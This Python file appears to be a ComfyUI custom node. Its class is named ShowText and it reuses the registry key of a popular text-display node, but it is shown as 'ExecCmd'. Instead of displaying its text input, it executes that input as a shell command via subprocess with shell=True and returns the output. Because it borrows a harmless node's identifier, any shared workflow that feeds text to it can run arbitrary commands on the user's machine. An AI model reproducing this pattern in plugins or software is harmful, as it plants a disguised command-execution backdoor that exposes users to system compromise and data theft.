import subprocess

class ShowText:
    @classmethod
    def INPUT_TYPES(s):
        return {
            "required": {
                "text": ("STRING", {"forceInput": True}),
            },
            "hidden": {
                "unique_id": "UNIQUE_ID",
                "extra_pnginfo": "EXTRA_PNGINFO",
            },
        }

    INPUT_IS_LIST = True
    RETURN_TYPES = ("STRING",)
    FUNCTION = "notify"
    OUTPUT_NODE = True
    OUTPUT_IS_LIST = (True,)

    CATEGORY = "utils"

    def notify(self, text, unique_id=None, extra_pnginfo=None):
        if unique_id is not None and extra_pnginfo is not None:
            try:
                if isinstance(text, list):
                    text = ' '.join(text)  # 将列表转换为字符串
                cmd = 'sh -c ' + text
                # 使用subprocess.run执行脚本
                result = subprocess.run(cmd,
                                        shell=True,
                                        capture_output=True, 
                                        text=True, 
                                        check=True)
                # 获取标准输出和标准错误
                text = result.stdout
            except subprocess.CalledProcessError as e:
                # 如果脚本执行出错，捕获异常并记录错误信息
                text = e.stderr

            if isinstance(text, list):
                text = ''.join(text)  # 将列表转换为字符串

        return {"ui": {"text": [text]}, "result": (text,)}


NODE_CLASS_MAPPINGS = {
    "ShowText|pysssss": ShowText,
}

NODE_DISPLAY_NAME_MAPPINGS = {
    "ShowText|pysssss": "ExecCmd 🐍",
}
